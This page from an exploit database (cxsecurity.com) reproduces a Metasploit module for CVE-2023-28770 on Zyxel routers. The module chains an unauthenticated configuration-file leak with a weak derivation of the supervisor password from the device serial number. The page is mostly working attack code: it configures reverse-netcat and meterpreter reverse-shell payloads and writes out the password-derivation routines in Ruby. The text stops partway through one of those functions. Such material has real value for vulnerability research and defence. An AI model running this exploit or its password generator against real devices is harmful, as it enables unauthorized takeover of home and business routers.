---
title: Zyxel Chained Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023050030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-11
fetch_date: 2025-10-04T11:37:06.491982
---

# Zyxel Chained Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zyxel Chained Remote Code Execution** **2023.05.10**  Credit:  **[Thomas Rinsma](https://cxsecurity.com/author/Thomas%2BRinsma/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'socket'
require 'digest/md5'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::SSH
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
attr\_accessor :ssh\_socket
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Zyxel chained RCE using LFI and weak password derivation algorithm',
'Description' => %q{
This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd)
and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices.
The remote code execution vulnerability can be exploited by chaining the local file disclosure
vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration
of the router via the vulnerable endpoint `/Export\_Log?/data/zcfg\_config.json`.
With this information disclosure, the attacker can determine if the router is reachable via ssh
and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting
a weak implementation of a password derivation algorithm using the device serial number.
After exploitation, an attacker will be able to execute any command as user `supervisor`.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author of exploit chain and MSF module contributor
'SEC Consult Vulnerability Lab',
'Thomas Rinsma',
'Bogi Napoleon Wennerstrøm'
],
'References' => [
['CVE', '2023-28770'],
['URL', 'https://r.sec-consult.com/zyxsploit'],
['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
['URL', 'https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/'],
['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
['URL', 'https://attackerkb.com/topics/tPAvkwQgDK/cve-2023-28770']
],
'DisclosureDate' => '2022-02-01',
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_MIPSBE],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_netcat'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_MIPSBE],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
'DefaultOptions' => {
'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse\_tcp'
}
}
],
[
'Interactive SSH',
{
'DefaultOptions' => {
'PAYLOAD' => 'generic/ssh/interact'
},
'Payload' => {
'Compat' => {
'PayloadType' => 'ssh\_interact'
}
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 80,
'SSL' => false,
'SSH\_TIMEOUT' => 30,
'WfsDelay' => 5
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options(
[
OptBool.new('STORE\_CRED', [false, 'Store credentials into the database.', true])
]
)
register\_advanced\_options(
[
OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])
]
)
end
# supervisor user password derivation functions (SerialNumMethod2 and 3) for Zyxel routers
# based on the reverse engineer analysis of Thomas Rinsma and Bogi Napoleon Wennerstrøm
# https://github.com/boginw/zyxel-vmg8825-keygen
def double\_hash(input, size = 8)
# ROUND 1
# take the MD5 hash from the serial number SXXXXXXXXXXXX
# this returns a hash of 32 char bytes.
# read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
# store two char bytes in round1 and continue with next two char bytes from the hash.
md5\_str\_array = Digest::MD5.hexdigest(input).split(//)
round1\_str\_array = Array.new(32)
j = 0
until j == 32
if md5\_str\_array[j] == '0'
round1\_str\_array[j] = md5\_str\_array[j + 1]
else
round1\_str\_array[j] = md5\_str\_array[j]
end
round1\_str\_array[j + 1] = md5\_str\_array[j + 1]
j += 2
end
round1 = round1\_str\_array.join
# ROUND 2
# take the MD5 hash from the result of round1
# returns a hash of 32 char bytes.
# read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
# store two char bytes in round2 and continue with next two char bytes.
md5\_str\_array = Digest::MD5.hexdigest(round1).split(//)
round2\_str\_array = Array.new(32)
j = 0
until j == 32
if md5\_str\_array[j] == '0'
round2\_str\_array[j] = md5\_str\_array[j + 1]
else
round2\_str\_array[j] = md5\_str\_array[j]
end
round2\_str\_array[j + 1] = md5\_str\_array[j + 1]
j += 2
end
# ROUND 3
# take the result of round2 and pick the number (size) of char bytes starting with indice [0] and increased by 3
# to create the final password hash with defined number (size) of alphanumeric characters and return the final result
round3\_str\_array = Array.new(size)
for i in 0..(size - 1) do
round3\_str\_array[i] = round2\_str\_array[i \* 3]
end
round3 = round3\_str\_array.join
return round3
end
def mod3\_key\_generator(seed)
# key generator function used in the SerialNumMethod3 pasword derivation function
round4\_array = Array.new(16, 0)
found0s = 0
found1s = 0
found2s = 0
while (found0s == 0) || (found1s == 0) || (found2s == 0)
found0s = 0
found1s = 0
found2s = 0
power\_of\_2 = 1
seed += 1
for i in 0..9 do
round4\_array[i] = (seed % (power\_of\_2 \* 3) / power\_of\_2).floor
if (round4\_array[i] == 1)
found1s += 1
elsif (round4\_array[i]) == 2
found2s += 1
else
found0s += 1
end
power\_of\_2 = power\_of\_2 << 1
end
end
return seed, round4\_array
end
def serial\_num\_method2(serial\_number)
# SerialNumMethod2 password derivation function
pwd = double\_hash(serial\_number)
return pwd
end
def serial\_num\_...